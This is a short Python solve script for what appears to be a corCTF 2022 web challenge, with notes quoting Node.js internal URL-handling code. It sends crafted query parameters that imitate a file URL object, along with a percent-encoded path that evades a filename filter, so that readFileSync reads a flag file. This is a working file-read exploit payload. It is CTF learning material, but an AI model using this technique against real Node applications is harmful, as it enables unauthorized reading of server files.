import requests

URL = "http://localhost:3456"

'''
https://brycec.me/posts/corctf_2022_challenges
Payload = ?file[href]=x&file[origin]=x&file[protocol]=file:&file[hostname]=&file[pathname]=fl%2561g.txt
'''

r = requests.get(URL,
                 params={"file[href]": "-",
                         "file[origin]": "-",
                         "file[protocol]": "file:",
                         "file[hostname]": "",
                         "file[pathname]": "/app/fl%61g.txt"
                         }
                 # proxies={"http": "http://localhost:8080"}
                 )
print(r.text)

'''

https://github.com/nodejs/node/blob/e028edb17d5e5d5f61d1b117d5e4c675ff029fd5/lib/internal/url.js#L1565
function toPathIfFileURL(fileURLOrPath) {
  if (!isURLInstance(fileURLOrPath))
    return fileURLOrPath;
  return fileURLToPath(fileURLOrPath);
}

https://github.com/nodejs/node/blob/e028edb17d5e5d5f61d1b117d5e4c675ff029fd5/lib/internal/url.js#L1561
readFileSync -> openSync -> getValidatedPath (in `internal/fs/utils.js`) -> toPathIfFileURL (in `internal/url.js`)

function isURLInstance(fileURLOrPath) {
  return fileURLOrPath != null && fileURLOrPath.href && fileURLOrPath.origin;
}

https://github.com/nodejs/node/blob/e028edb17d5e5d5f61d1b117d5e4c675ff029fd5/lib/internal/url.js#L1482
function fileURLToPath(path) {
  if (typeof path === 'string')
    path = new URL(path);
  else if (!isURLInstance(path))
    throw new ERR_INVALID_ARG_TYPE('path', ['string', 'URL'], path);
  if (path.protocol !== 'file:')
    throw new ERR_INVALID_URL_SCHEME('file');
  return isWindows ? getPathFromURLWin32(path) : getPathFromURLPosix(path);
}

https://github.com/nodejs/node/blob/e028edb17d5e5d5f61d1b117d5e4c675ff029fd5/lib/internal/url.js#L1464
function getPathFromURLPosix(url) {
  if (url.hostname !== '') {
    throw new ERR_INVALID_FILE_URL_HOST(platform);
  }
  const pathname = url.pathname;
  for (let n = 0; n < pathname.length; n++) {
    if (pathname[n] === '%') {
      const third = pathname.codePointAt(n + 2) | 0x20;
      if (pathname[n + 1] === '2' && third === 102) {
        throw new ERR_INVALID_FILE_URL_PATH(
          'must not include encoded / characters'
        );
      }
    }
  }
  return decodeURIComponent(pathname);
}
'''
